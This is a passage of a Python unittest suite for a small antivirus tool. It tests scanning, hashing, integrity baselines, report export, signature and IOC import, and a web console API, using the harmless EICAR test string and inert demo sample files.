        self.assertEqual(result.findings, [])


class SinceTests(unittest.TestCase):
    """v1.6: --since incremental scan (mtime cutoff in walk_files)."""

    def test_since_skips_older_files(self):
        base = Path(tempfile.mkdtemp(prefix="av-since-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        app = App(base)
        app.scanner.config.cache_enabled = False

        d = base / "files"
        d.mkdir()
        (d / "old.txt").write_text("old")
        (d / "new.txt").write_text("new")
        old = time.time() - 3600
        os.utime(d / "old.txt", (old, old))

        app.scanner.config.since_ts = time.time() - 600
        result = app.scanner.scan_path(d)
        self.assertEqual(result.files_scanned, 1)
        self.assertEqual(result.files_skipped, 1)

    def test_since_not_set_scans_everything(self):
        base = Path(tempfile.mkdtemp(prefix="av-since0-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        app = App(base)
        app.scanner.config.cache_enabled = False
        d = base / "files"
        d.mkdir()
        for i in range(3):
            (d / f"f{i}.txt").write_text("x")
        result = app.scanner.scan_path(d)
        self.assertEqual(result.files_scanned, 3)
        self.assertEqual(result.files_skipped, 0)


class HashCommandTests(unittest.TestCase):
    """v1.6: `antivirus hash` prints sha256/md5/sha1."""

    def test_hash_cli_output(self):
        import hashlib

        from antivirus.cli import main

        base = Path(tempfile.mkdtemp(prefix="av-hash-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        f = base / "f.bin"
        blob = os.urandom(64)
        f.write_bytes(blob)

        old_cwd = os.getcwd()
        os.chdir(base)
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["hash", str(f)])
        finally:
            os.chdir(old_cwd)
        out = buf.getvalue()
        self.assertEqual(rc, 0)
        self.assertIn(hashlib.sha256(blob).hexdigest(), out)
        self.assertIn(hashlib.md5(blob).hexdigest(), out)
        self.assertIn(hashlib.sha1(blob).hexdigest(), out)

    def test_hash_cli_json(self):
        import hashlib

        from antivirus.cli import main

        base = Path(tempfile.mkdtemp(prefix="av-hashj-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        f = base / "f.bin"
        blob = os.urandom(64)
        f.write_bytes(blob)

        old_cwd = os.getcwd()
        os.chdir(base)
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["hash", str(f), "--json"])
        finally:
            os.chdir(old_cwd)
        self.assertEqual(rc, 0)
        data = json.loads(buf.getvalue())
        self.assertEqual(data[0]["sha256"], hashlib.sha256(blob).hexdigest())
        self.assertEqual(data[0]["size"], len(blob))


class ReportDiffTests(unittest.TestCase):
    """v1.6: `report diff` shows what is new / what was cleared."""

    def _write_report(self, d: Path, findings) -> Path:
        d.mkdir(parents=True, exist_ok=True)
        p = d / f"scan-{int(time.time() * 1000)}.json"
        p.write_text(json.dumps({"target": "x", "clean": not findings,
                                 "findings": findings}))
        return p

    def test_diff_reports_pure_function(self):
        from antivirus.report import diff_reports

        a = {"path": "a", "name": "A", "severity": "high"}
        b = {"path": "b", "name": "B", "severity": "medium"}
        diff = diff_reports({"findings": [a]}, {"findings": [a, b]})
        self.assertEqual(diff["new"], [b])
        self.assertEqual(diff["cleared"], [])
        self.assertEqual(diff["unchanged"], [a])
        diff = diff_reports({"findings": [a, b]}, {"findings": [b]})
        self.assertEqual(diff["new"], [])
        self.assertEqual(diff["cleared"], [a])

    def test_report_diff_cli(self):
        from antivirus.cli import main

        base = Path(tempfile.mkdtemp(prefix="av-diff-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        rep = base / "reports"
        old_f = {"path": "x", "name": "OldSig", "severity": "high"}
        new_f = {"path": "y", "name": "NewSig", "severity": "medium"}
        old = self._write_report(rep, [old_f])
        time.sleep(0.01)
        new = self._write_report(rep, [new_f])

        old_cwd = os.getcwd()
        os.chdir(base)
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["report", "diff", "--report-dir", str(rep),
                           str(old), str(new)])
        finally:
            os.chdir(old_cwd)
        out = buf.getvalue()
        self.assertEqual(rc, 1)  # new threats exist
        self.assertIn("NewSig", out)
        self.assertIn("OldSig", out)  # in the cleared section


class SigImportExportTests(unittest.TestCase):
    """v1.6: `sig export` / `sig import` move databases between files."""

    def test_roundtrip_and_duplicate_skip(self):
        from antivirus.cli import main

        base = Path(tempfile.mkdtemp(prefix="av-sigio-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        db1 = base / "db1.json"
        db2 = base / "db2.json"
        export = base / "out.json"
        db1.write_text(json.dumps({"signatures": []}) + "\n")
        shutil.copyfile(BUNDLED_DB, db2)  # db2 starts with the bundled EICAR sig

        old_cwd = os.getcwd()
        os.chdir(base)
        try:
            def run(*argv):
                buf = io.StringIO()
                with contextlib.redirect_stdout(buf):
                    rc = main(list(argv))
                return rc, buf.getvalue()

            rc, _ = run("sig", "--signatures", str(db1), "add",
                        "--id", "T-1", "--name", "One", "--pattern", "alpha")
            self.assertEqual(rc, 0)
            rc, out = run("sig", "--signatures", str(db1), "export", str(export))
            self.assertEqual(rc, 0)
            self.assertTrue(export.exists())
            data = json.loads(export.read_text())
            self.assertEqual(len(data["signatures"]), 1)

            # db2 starts as a copy of the bundled DB (the App fixture does
            # that); import must add T-1 and skip it on the second pass.
            rc, out = run("sig", "--signatures", str(db2), "import", str(export))
            self.assertEqual(rc, 0)
            self.assertIn("Imported 1", out)
            rc, out = run("sig", "--signatures", str(db2), "import", str(export))
            self.assertEqual(rc, 0)
            self.assertIn("1 already present", out)

            rc, out = run("sig", "--signatures", str(db2), "show")
            self.assertEqual(rc, 0)
            self.assertIn("T-1", out)
        finally:
            os.chdir(old_cwd)


class IntegrityTests(unittest.TestCase):
    """v1.7: manifest baselines + scan --baseline (file integrity)."""

    def test_build_manifest_and_compare(self):
        from antivirus.integrity import (
            CHANGED,
            MISSING,
            NEW,
            build_manifest,
            compare_baseline,
            save_manifest,
            load_manifest,
        )

        base = Path(tempfile.mkdtemp(prefix="av-int-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        app = App(base)

        d = base / "tree"
        d.mkdir()
        (d / "a.txt").write_text("one\n")
        (d / "b.txt").write_text("two\n")
        manifest = build_manifest(d, app.config)
        self.assertEqual(set(manifest["files"]), {"a.txt", "b.txt"})

        save_manifest(manifest, base / "b.json")
        self.assertEqual(load_manifest(base / "b.json")["files"],
                         manifest["files"])

        # mutate the tree: change a, add c, delete b
        (d / "a.txt").write_text("CHANGED\n")
        (d / "c.txt").write_text("three\n")
        (d / "b.txt").unlink()

        app.scanner.config.cache_enabled = False
        result = app.scanner.scan_path(d)
        current = {str(Path(p).resolve().relative_to(d.resolve())): m
                   for p, m in result.file_meta.items()}
        findings = compare_baseline(manifest, current)
        self.assertIn(CHANGED, {f.name for f in findings})
        self.assertIn(MISSING, {f.name for f in findings})
        self.assertIn(NEW, {f.name for f in findings})
        self.assertEqual(sum(1 for f in findings if f.name == CHANGED), 1)

    def test_cli_scan_baseline(self):
        from antivirus.cli import main
        from antivirus.integrity import (
            CHANGED,
            MISSING,
            NEW,
            build_manifest,
            save_manifest,
        )

        base = Path(tempfile.mkdtemp(prefix="av-intcli-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        app = App(base)

        d = base / "tree"
        d.mkdir()
        (d / "a.txt").write_text("one\n")
        (d / "b.txt").write_text("two\n")
        bfile = base / "b.json"
        save_manifest(build_manifest(d, app.config), bfile)

        (d / "a.txt").write_text("CHANGED\n")
        (d / "c.txt").write_text("three\n")
        (d / "b.txt").unlink()

        old_cwd = os.getcwd()
        os.chdir(base)
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["scan", str(d), "--baseline", str(bfile),
                           "--json"])
        finally:
            os.chdir(old_cwd)
        data = json.loads(buf.getvalue())
        names = {f["name"] for f in data["findings"]}
        self.assertEqual(rc, 1)
        self.assertIn(CHANGED, names)
        self.assertIn(NEW, names)
        self.assertIn(MISSING, names)


class SamplesCommandTests(unittest.TestCase):
    """v1.7: `antivirus samples` regenerates the inert demo tree."""

    def test_samples_command_builds_scannable_tree(self):
        from antivirus.cli import main

        base = Path(tempfile.mkdtemp(prefix="av-samples-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        out = base / "out"

        old_cwd = os.getcwd()
        os.chdir(base)
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["samples", str(out)])
        finally:
            os.chdir(old_cwd)
        self.assertEqual(rc, 0)
        for rel in ("eicar-test.txt", "clean.txt",
                    "behavior/suspicious.exe", "behavior/clean.exe",
                    "behavior/packed-upx.exe", "behavior/suspicious.elf",
                    "behavior/clean.elf", "behavior/sneaky.zip",
                    "behavior/sneaky.tar.gz", "behavior/dropper.bat"):
            self.assertTrue((out / rel).exists(), rel)

        app = App(base)
        app.scanner.config.cache_enabled = False
        result = app.scanner.scan_path(out)
        names = {f.name for f in result.findings}
        self.assertIn("EICAR-Test-File", names)
        self.assertTrue(any("ELF imports" in n for n in names))
        self.assertTrue(any("slip" in n for n in names))


class ReportSummaryTests(unittest.TestCase):
    """v1.7: `report summary` aggregates saved reports."""

    def test_report_summary_output(self):
        from antivirus.cli import main

        base = Path(tempfile.mkdtemp(prefix="av-sum-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        rep = base / "reports"
        rep.mkdir()
        f1 = {"path": "x", "name": "SigA", "severity": "high"}
        f2 = {"path": "y", "name": "SigA", "severity": "high"}
        f3 = {"path": "z", "name": "SigB", "severity": "low"}
        (rep / "scan-00000000-000000.json").write_text(json.dumps(
            {"target": "t", "clean": False, "findings": [f1, f2]}))
        (rep / "scan-00000000-000001.json").write_text(json.dumps(
            {"target": "t", "clean": False, "findings": [f3]}))

        old_cwd = os.getcwd()
        os.chdir(base)
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["report", "summary", "--report-dir", str(rep)])
        finally:
            os.chdir(old_cwd)
        out = buf.getvalue()
        self.assertEqual(rc, 0)
        self.assertIn("2 report(s)", out)
        self.assertIn("Total findings:   3", out)
        self.assertIn("2  SigA", out)
        self.assertIn("1  SigB", out)
        self.assertIn("high: 2", out)
        self.assertIn("low: 1", out)


class WebConsoleTests(unittest.TestCase):
    """v1.7: the stdlib web console (dashboard + JSON API)."""

    def setUp(self):
        base = Path(tempfile.mkdtemp(prefix="av-web-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        self.base = base
        self.app_fixture = App(base)
        self.app_fixture.scanner.config.cache_enabled = False

        import threading
        from http.server import ThreadingHTTPServer

        from antivirus.web import WebApp, _Handler

        app = WebApp(self.app_fixture.config, self.app_fixture.db,
                     self.app_fixture.scanner, self.app_fixture.quarantine)
        server = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
        server.app = app
        self.server = server
        self.port = server.server_address[1]
        self.thread = threading.Thread(target=server.serve_forever,
                                       daemon=True)
        self.thread.start()

    def tearDown(self):
        self.server.shutdown()
        self.server.server_close()

    def _req(self, method, path, body=None):
        import urllib.error
        import urllib.request

        data = None
        headers = {}
        if body is not None:
            data = json.dumps(body).encode("utf-8")
            headers["Content-Type"] = "application/json"
        request = urllib.request.Request(
            f"http://127.0.0.1:{self.port}{path}", data=data,
            headers=headers, method=method)
        try:
            with urllib.request.urlopen(request, timeout=15) as resp:
                return resp.status, json.loads(resp.read() or b"{}")
        except urllib.error.HTTPError as exc:
            return exc.code, json.loads(exc.read() or b"{}")

    def test_health_and_page(self):
        status, data = self._req("GET", "/api/health")
        self.assertEqual(status, 200)
        self.assertTrue(data["ok"])

        import urllib.request

        with urllib.request.urlopen(
                f"http://127.0.0.1:{self.port}/", timeout=15) as resp:
            html = resp.read().decode("utf-8")
        self.assertIn("AntiVirus Web Console", html)

    def test_scan_job_flow(self):
        (self.base / "victim.txt").write_bytes(EICAR)
        status, data = self._req("POST", "/api/scan", {"target": str(self.base)})
        self.assertEqual(status, 200)
        job = data["job"]
        self.assertEqual(job["status"], "running")

        detail = None
        for _ in range(50):
            time.sleep(0.2)
            status, detail = self._req("GET", f"/api/jobs/{job['id']}")
            if detail["job"]["status"] != "running":
                break
        self.assertEqual(status, 200)
        self.assertEqual(detail["job"]["status"], "done")
        result = detail["result"]
        self.assertTrue(any(f["name"] == "EICAR-Test-File"
                            for f in result["findings"]))

    def test_signatures_api(self):
        status, data = self._req("GET", "/api/signatures")
        before = {s["id"] for s in data["signatures"]}

        status, data = self._req(
            "POST", "/api/signatures",
            {"id": "WEB-T", "name": "WebT", "severity": "low",
             "pattern": "WEBTPAYLOAD"})
        self.assertEqual(status, 200)

        status, data = self._req("GET", "/api/signatures")
        self.assertIn("WEB-T", {s["id"] for s in data["signatures"]})

        status, data = self._req("POST", "/api/signatures/remove",
                                 {"id": "WEB-T"})
        self.assertEqual(status, 200)
        status, data = self._req("GET", "/api/signatures")
        self.assertEqual({s["id"] for s in data["signatures"]}, before)

        status, data = self._req("POST", "/api/signatures/remove",
                                 {"id": "NO-SUCH"})
        self.assertEqual(status, 404)

    def test_quarantine_action_loop(self):
        (self.base / "victim.txt").write_bytes(EICAR)
        status, data = self._req("POST", "/api/scan",
                                 {"target": str(self.base),
                                  "action": "quarantine"})
        self.assertEqual(status, 200)
        job = data["job"]
        for _ in range(50):
            time.sleep(0.2)
            status, detail = self._req("GET", f"/api/jobs/{job['id']}")
            if detail["job"]["status"] != "running":
                break
        self.assertEqual(detail["job"]["status"], "done")
        self.assertFalse((self.base / "victim.txt").exists())

        status, data = self._req("GET", "/api/quarantine")
        self.assertEqual(status, 200)
        self.assertEqual(len(data["items"]), 1)
        qid = data["items"][0]["id"]

        status, data = self._req("POST", "/api/quarantine/restore",
                                 {"id": qid})
        self.assertEqual(status, 200)
        self.assertTrue((self.base / "victim.txt").exists())


class ModuleAPITests(unittest.TestCase):
    """v1.8: the package works as a plain importable module."""

    def test_one_shot_scan(self):
        import antivirus

        base = Path(tempfile.mkdtemp(prefix="av-mod-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        (base / "victim.txt").write_bytes(EICAR)

        result = antivirus.scan(base, base=str(base))
        self.assertTrue(any(f.name == "EICAR-Test-File"
                            for f in result.findings))
        self.assertFalse(result.clean)

    def test_antivirus_class(self):
        import antivirus

        base = Path(tempfile.mkdtemp(prefix="av-av-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        av = antivirus.Antivirus(base=str(base))

        # signature added via the API is picked up by the next scan
        av.add_signature(id="AV-MOD-1", name="ModOne", severity="high",
                         pattern="MODONE-MARKER")
        f = base / "marker.txt"
        f.write_text("here is MODONE-MARKER inside\n")
        self.assertTrue(any(x.name == "ModOne"
                            for x in av.scan_file(f)))

        # eicar one-file scan + file_info + manifest
        e = base / "eicar.txt"
        e.write_bytes(EICAR)
        findings = av.scan_file(e)
        self.assertTrue(findings)

        info = av.file_info(e)
        import hashlib

        self.assertEqual(info["sha256"], hashlib.sha256(EICAR).hexdigest())
        self.assertEqual(info["size"], len(EICAR))

        manifest = av.manifest(base)
        self.assertIn("eicar.txt", manifest["files"])

        # directory scan with action=quarantine via the API
        result = av.scan(base, action="quarantine")
        self.assertIn("quarantined as",
                      " ".join(result.notes.values()))
        self.assertFalse(e.exists())
        items = [i for i in av.quarantine.items()
                 if i.original_path.endswith("eicar.txt")]
        self.assertTrue(items)
        av.quarantine.restore(items[0].id)
        self.assertTrue(e.exists())

    def test_apply_actions_detect_is_noop(self):
        import antivirus

        base = Path(tempfile.mkdtemp(prefix="av-act-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        (base / "e.txt").write_bytes(EICAR)
        result = antivirus.scan(base, base=str(base), action="detect")
        self.assertTrue(result.findings)
        self.assertTrue((base / "e.txt").exists())


class TuiModelTests(unittest.TestCase):
    """v1.8: the curses TUI's model layer (headless, no terminal)."""

    def setUp(self):
        base = Path(tempfile.mkdtemp(prefix="av-tui-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        from antivirus.tui import TuiModel
        from antivirus.web import WebApp

        app = App(base)
        app.scanner.config.cache_enabled = False
        self.model = TuiModel(WebApp(app.config, app.db, app.scanner,
                                     app.quarantine), target=str(base))

    def _wait_done(self):
        for _ in range(200):
            self.model.tick()
            if not self.model.running:
                return
            time.sleep(0.05)

    def test_scan_cycle(self):
        (self.model.app.config.quarantine_dir.parent / "victim.txt") \
            .write_bytes(EICAR)
        self.model.start_scan()
        self.assertFalse(self.model.error)
        self._wait_done()
        self.assertEqual(self.model.job.status, "done")
        self.assertTrue(any(f["name"] == "EICAR-Test-File"
                            for f in self.model.findings))
        self.assertIn("INFECTED", self.model.message)

    def test_selection_and_toggles(self):
        self.model.findings = [
            {"severity": "high", "name": "A", "kind": "k", "path": "p",
             "message": "m"},
            {"severity": "low", "name": "B", "kind": "k", "path": "p",
             "message": "m"},
        ]
        self.model.move(1)
        self.assertEqual(self.model.selection, 1)
        self.model.move(1)  # wraps around
        self.assertEqual(self.model.selection, 0)
        self.model.toggle_fast()
        self.assertTrue(self.model.fast)
        self.model.cycle_action()
        self.assertEqual(self.model.action, "quarantine")
        self.model.set_since("2h")
        self.assertEqual(self.model.since, "2h")
        self.model.set_since("nope")
        self.assertTrue(self.model.error)
        self.assertEqual(self.model.since, "2h")
        self.model.bottom()
        self.assertIn("B", self.model.detail_text)

    def test_invalid_target(self):
        self.model.target = "/definitely/not/here"
        self.model.start_scan()
        self.assertIn("no such file", self.model.error)


class FileinfoTests(unittest.TestCase):
    """v1.8: file identification + `antivirus fileinfo` command."""

    def test_identify_content(self):
        from antivirus.fileinfo import identify_content

        self.assertIn("PE", identify_content(b"MZ\x90\x00rest", "a.exe"))
        self.assertIn("ELF", identify_content(b"\x7fELF\x02\x01", "a"))
        self.assertIn("64-bit", identify_content(b"\x7fELF\x02\x01", "a"))
        self.assertIn("32-bit", identify_content(b"\x7fELF\x01\x01", "a"))
        self.assertEqual(identify_content(b"\x1f\x8b\x08", "a.gz"),
                         "gzip stream")
        self.assertEqual(identify_content(b"PK\x03\x04", "a.zip"),
                         "ZIP archive")
        tar_head = b"\x00" * 257 + b"ustar" + b"\x00" * 10
        self.assertEqual(identify_content(tar_head, "a.tar"), "TAR archive")
        self.assertIn("shebang", identify_content(b"#!/bin/sh\n", "a.sh"))
        self.assertIn("Python", identify_content(b"", "a.py"))

    def test_fileinfo_cli(self):
        from antivirus.cli import main

        old_cwd = os.getcwd()
        os.chdir(ROOT)
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["fileinfo", "samples/behavior/suspicious.exe",
                           "samples/behavior/sneaky.tar.gz",
                           "samples/behavior/harmless.sh"])
        finally:
            os.chdir(old_cwd)
        out = buf.getvalue()
        self.assertEqual(rc, 0)
        self.assertIn("sha256:", out)
        self.assertIn("PE", out)
        self.assertIn("gzip", out)
        self.assertIn("shebang", out)


class GuiFilterTests(unittest.TestCase):
    """v1.8: the GUI's findings filter predicate (headless)."""

    def test_finding_matches(self):
        from antivirus.gui import finding_matches
        from antivirus.models import Finding

        f = Finding(path="/tmp/a.py", kind="behavior",
                    name="Shell command execution",
                    severity="medium",
                    message="os.system call found")
        self.assertTrue(finding_matches(f, "", None))
        self.assertTrue(finding_matches(f, "os.system", None))
        self.assertTrue(finding_matches(f, "A.PY", None))
        self.assertFalse(finding_matches(f, "network", None))
        self.assertTrue(finding_matches(f, "", {"medium"}))
        self.assertFalse(finding_matches(f, "", {"high"}))


class WebBaselinesAndInfoTests(WebConsoleTests):
    """v1.8: web API additions (baselines, fileinfo, reports, docs)."""

    def test_baselines_and_scan_against_baseline(self):
        d = self.base / "tree"
        d.mkdir()
        (d / "a.txt").write_text("one\n")
        (d / "b.txt").write_text("two\n")

        status, data = self._req("POST", "/api/baselines",
                                 {"target": str(d), "id": "t1"})
        self.assertEqual(status, 200)
        self.assertEqual(data["files"], 2)

        status, data = self._req("GET", "/api/baselines")
        self.assertEqual(status, 200)
        self.assertIn("t1", {b["id"] for b in data["baselines"]})

        (d / "a.txt").write_text("CHANGED\n")
        (d / "b.txt").unlink()
        (d / "c.txt").write_text("three\n")

        status, data = self._req("POST", "/api/scan",
                                 {"target": str(d), "baseline": "t1"})
        self.assertEqual(status, 200)
        job = data["job"]
        for _ in range(50):
            time.sleep(0.2)
            status, detail = self._req("GET", f"/api/jobs/{job['id']}")
            if detail["job"]["status"] != "running":
                break
        self.assertEqual(detail["job"]["status"], "done")
        integrity = {f["name"] for f in detail["result"]["findings"]
                     if f["kind"] == "integrity"}
        self.assertEqual(integrity,
                         {"File changed since baseline",
                          "File missing since baseline",
                          "File not in baseline"})

    def test_fileinfo_api(self):
        (self.base / "victim.txt").write_bytes(EICAR)
        status, data = self._req(
            "GET", "/api/fileinfo?path=" +
            urllib_parse(self.base / "victim.txt"))
        self.assertEqual(status, 200)
        self.assertEqual(data["size"], len(EICAR))
        self.assertEqual(len(data["sha256"]), 64)
        self.assertTrue(data["findings"])

        status, data = self._req("GET", "/api/fileinfo?path=/nope/missing")
        self.assertEqual(status, 404)

    def test_reports_and_docs(self):
        status, data = self._req("GET", "/api/reports")
        self.assertEqual(status, 200)
        self.assertIsInstance(data["reports"], list)

        status, data = self._req("GET", "/api/reports/summary")
        self.assertEqual(status, 200)
        self.assertIn("reports", data)
        self.assertIn("top_indicators", data)

        import urllib.request

        with urllib.request.urlopen(
                f"http://127.0.0.1:{self.port}/api/docs",
                timeout=15) as resp:
            html = resp.read().decode("utf-8")
        self.assertIn("JSON API", html)
        self.assertIn("/api/baselines", html)


def urllib_parse(path: Path) -> str:
    from urllib.parse import quote

    return quote(str(path), safe="/")


class VerifyTests(unittest.TestCase):
    """v1.9: `verify` – fast integrity check (hash + diff, no scan)."""

    def setUp(self):
        base = Path(tempfile.mkdtemp(prefix="av-verify-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        self.base = base
        self.app = App(base)
        self.d = base / "tree"
        self.d.mkdir()
        (self.d / "a.txt").write_text("one\n")
        (self.d / "b.txt").write_text("two\n")

    def _baseline(self):
        from antivirus.integrity import build_manifest, save_manifest

        bfile = self.base / "b.json"
        save_manifest(build_manifest(self.d, self.app.config), bfile)
        return bfile

    def test_verify_tree_clean_and_dirty(self):
        from antivirus.integrity import CHANGED, MISSING, NEW, verify_tree

        bfile = self._baseline()
        baseline = json.loads(bfile.read_text())
        self.assertEqual(verify_tree(self.d, baseline, self.app.config), [])

        (self.d / "a.txt").write_text("CHANGED\n")
        (self.d / "b.txt").unlink()
        (self.d / "c.txt").write_text("three\n")
        findings = verify_tree(self.d, baseline, self.app.config)
        self.assertEqual({f.name for f in findings},
                         {CHANGED, MISSING, NEW})

    def test_cli_verify_json(self):
        from antivirus.cli import main

        bfile = self._baseline()
        (self.d / "a.txt").write_text("CHANGED\n")
        (self.d / "c.txt").write_text("three\n")

        old_cwd = os.getcwd()
        os.chdir(self.base)
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["verify", str(self.d), "--baseline", str(bfile),
                           "--json"])
        finally:
            os.chdir(old_cwd)
        data = json.loads(buf.getvalue())
        self.assertEqual(rc, 1)
        self.assertEqual(data["changed"], 1)
        self.assertEqual(data["missing"], 0)
        self.assertEqual(data["new"], 1)
        self.assertFalse(data["clean"])

    def test_cli_verify_clean_rc0_and_missing_baseline_rc2(self):
        from antivirus.cli import main

        bfile = self._baseline()
        old_cwd = os.getcwd()
        os.chdir(self.base)
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["verify", str(self.d), "--baseline", str(bfile)])
            self.assertEqual(rc, 0)
            self.assertIn("No changes since the baseline", buf.getvalue())

            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["verify", str(self.d),
                           "--baseline", str(self.base / "nope.json")])
            self.assertEqual(rc, 2)
        finally:
            os.chdir(old_cwd)

    def test_module_api_verify_by_id(self):
        from antivirus import Antivirus
        from antivirus.integrity import build_manifest

        av = Antivirus(base=str(self.base))
        manifest = build_manifest(self.d, self.app.config)
        av.save_manifest(manifest, self.app.config.baseline_dir / "v1.json")
        self.assertEqual(av.verify(self.d, "v1"), [])

        (self.d / "a.txt").write_text("CHANGED\n")
        findings = av.verify(self.d, "v1")
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].name, "File changed since baseline")


class ExportTests(unittest.TestCase):
    """v1.9: `export` – findings from saved reports as CSV / JSONL."""

    def setUp(self):
        base = Path(tempfile.mkdtemp(prefix="av-export-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        self.base = base
        self.app = App(base)
        self.app.scanner.config.cache_enabled = False
        d = base / "tree"
        d.mkdir()
        (d / "eicar.txt").write_bytes(EICAR)
        (d / "clean.txt").write_text("fine\n")
        self.d = d

    def _scan(self):
        from antivirus.cli import main

        old_cwd = os.getcwd()
        os.chdir(self.base)
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["scan", str(self.d), "--json"])
        finally:
            os.chdir(old_cwd)
        self.assertEqual(rc, 1)
        return json.loads(buf.getvalue())

    def test_export_csv(self):
        import csv

        from antivirus.cli import main

        result = self._scan()
        self.assertTrue(result["findings"])
        # digests must be backfilled on every finding (hash ones set them)
        self.assertTrue(all(f["sha256"] for f in result["findings"]))

        old_cwd = os.getcwd()
        os.chdir(self.base)
        try:
            buf = io.StringIO()
            err = io.StringIO()
            with contextlib.redirect_stdout(buf), \
                    contextlib.redirect_stderr(err):
                rc = main(["export"])
        finally:
            os.chdir(old_cwd)
        self.assertEqual(rc, 0)
        lines = [ln for ln in buf.getvalue().splitlines() if ln]
        self.assertIn("report,target,started_at,severity,kind,name,file,"
                      "sha256,size,action,message", lines[0])
        rows = list(csv.DictReader(buf.getvalue().splitlines()))
        self.assertEqual(len(rows), len(result["findings"]))
        eicar_rows = [r for r in rows
                      if r["file"].endswith("eicar.txt")]
        self.assertTrue(eicar_rows)
        self.assertEqual(eicar_rows[0]["severity"], "critical")
        self.assertEqual(len(eicar_rows[0]["sha256"]), 64)
        self.assertIn("finding(s)", err.getvalue())

    def test_export_jsonl_and_out_file(self):
        from antivirus.cli import main

        self._scan()
        out = self.base / "findings.jsonl"
        old_cwd = os.getcwd()
        os.chdir(self.base)
        try:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["export", "--format", "jsonl", "--out", str(out)])
        finally:
            os.chdir(old_cwd)
        self.assertEqual(rc, 0)
        lines = [ln for ln in out.read_text().splitlines() if ln]
        data = [json.loads(ln) for ln in lines]
        self.assertTrue(data)
        self.assertEqual(set(data[0]), {"report", "target", "started_at",
                                        "severity", "kind", "name", "file",
                                        "sha256", "size", "action", "message"})

    def test_export_specific_report_and_no_reports(self):
        from antivirus.cli import main

        self._scan()
        report_name = next((self.base / "reports").glob("scan-*.json")).name
        old_cwd = os.getcwd()
        os.chdir(self.base)
        try:
            buf = io.StringIO()
            err = io.StringIO()
            with contextlib.redirect_stdout(buf), \
                    contextlib.redirect_stderr(err):
                rc = main(["export", report_name])
            self.assertEqual(rc, 0)
            self.assertIn(report_name, buf.getvalue())

            # a second scan, then export only the second report
            (self.d / "more.txt").write_text("still fine\n")
            self._scan()
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["export", report_name])
            self.assertEqual(rc, 0)
            self.assertNotIn("more.txt", buf.getvalue())

            err = io.StringIO()
            with contextlib.redirect_stdout(io.StringIO()), \
                    contextlib.redirect_stderr(err):
                rc = main(["export", "no-such-report.json"])
            self.assertEqual(rc, 2)
        finally:
            os.chdir(old_cwd)


class IocImportTests(unittest.TestCase):
    """v1.9: `sig import` accepts plain-text IOC files."""

    def test_parse_ioc_text_kinds(self):
        from antivirus.signatures import parse_ioc_text

        text = (
            "# comment line\n"
            "; semicolon comment\n"
            "\n"
            "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f\n"
            "md5=44d88612fea8a8f36de82e1278abb02f\n"
            "pattern: ^MZ\\x00{2}\n"
            "PLAIN-MARKER\n"
        )
        sigs = parse_ioc_text(text, source="feedX")
        self.assertEqual(len(sigs), 4)
        kinds = [s.id for s in sigs]
        self.assertTrue(kinds[0].startswith("IOC-SHA256-"))
        self.assertTrue(kinds[1].startswith("IOC-MD5-"))
        self.assertTrue(kinds[2].startswith("IOC-PAT-"))
        self.assertTrue(kinds[3].startswith("IOC-PAT-"))
        self.assertEqual(sigs[0].sha256,
                         "275a021bbfb6489e54d471899f7db9d1663fc695"
                         "ec2fe2a2c4538aabf651fd0f")
        self.assertEqual(sigs[1].md5, "44d88612fea8a8f36de82e1278abb02f")
        self.assertEqual(sigs[2].pattern, "^MZ\\x00{2}")
        self.assertIn("PLAIN\\-MARKER", sigs[3].pattern)
        self.assertTrue(all(s.category == "feedX" for s in sigs))

    def test_parse_ioc_invalid_hex_is_literal(self):
        from antivirus.signatures import parse_ioc_text

        sigs = parse_ioc_text("sha256=not-a-real-hash")
        self.assertEqual(len(sigs), 1)
        self.assertFalse(sigs[0].sha256)
        self.assertTrue(sigs[0].pattern)

    def test_cli_import_plain_text_and_detect(self):
        from antivirus.cli import main
        from antivirus.scanner import Scanner

        base = Path(tempfile.mkdtemp(prefix="av-ioc-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        dbfile = base / "ioc.json"
        dbfile.write_text(json.dumps({"signatures": []}) + "\n")
        ioc = base / "feed.txt"
        ioc.write_text(
            "44d88612fea8a8f36de82e1278abb02f\n"
            "MY-UNIQUE-MARKER-77\n"
        )

        old_cwd = os.getcwd()
